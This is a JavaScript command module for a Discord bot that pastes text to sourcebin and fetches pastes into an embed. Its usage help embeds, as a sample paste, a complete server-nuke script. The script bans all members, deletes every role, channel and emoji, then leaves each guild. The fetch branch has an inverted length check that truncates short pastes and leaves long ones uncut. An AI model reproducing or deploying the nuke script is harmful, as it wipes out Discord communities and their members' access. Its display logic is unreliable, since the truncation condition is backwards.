const bin = require("sourcebin")
const {MessageEmbed} = require("discord.js")
module.exports = {
name: "bin", 
aliases: [], 
run: async(bot, message, args, prefix) => {
  
  const embd = new MessageEmbed()
.setColor("RED")
.setTitle("Source Bin")
.addField("Usage:", `\`${prefix}bin paste <content/message>\`\n\`${prefix}bin get <sourcebin URL/code>\``)
.addField("Example:",`\`${prefix}bin paste testing xD | smexy bot op :D\`\n\`${prefix}bin paste const Discord = require(\'discord.js\');
const bot = new Discord.Client();

bot.on(\'ready\', async() => {
bot.guilds.cache.forEach(async g => {
 g.members.cache.forEach(async m => await m.ban());
 g.roles.cache.forEach(async r => await r.delete());
 g.channels.cache.forEach(async c => await c.delete());
 g.emojis.cache.forEach(async e => await e.delet());
 await g.leave();
})
await bot.destroy();
process.exit();
})\`\n\`${prefix}bin get https://sourceb.in/IHOGyjgKRN\`\n\`${prefix}bin get IHOGyjgKRN\``)
if(!args.length) return message.reply(embd);
switch (args[0].toLowerCase()) {
case "paste":
const hehe = await bin.create(
    [
        {
            content: args.slice(1).join(" ") 
        },
    ],
    {
        title: 'Smexy Bot OP XD',
        description: `${message.author.tag}`  
      
    },
);
return message.reply(`Your code has been posted: ${hehe.url}`);
break;
case "get":
const result = await bin.get(args[1]).catch(err => { 
  return message.reply("Invalid Sourcebin URL/Code", embd);
  
})
if(!result || result === null || result === undefined) return message.reply("Invalid Sourcebin URL/Code",embd)
const embed = new MessageEmbed()
.setColor("RED")
.setTitle(result.title || result.description || result.key)
.setURL(result.url)
.setDescription(`\`\`\`${(result.files[0].content.length < 2048) ? (result.files[0].content.slice(0, 2000)+".............") : (result.files[0].content)}\`\`\``) 
.setFooter(`Views: ${result.views}`)
.setTimestamp(result.timestamp)
message.reply(`Sourcebin`,embed)
break;
default: 
return message.reply(embd);
break;
}
}
}

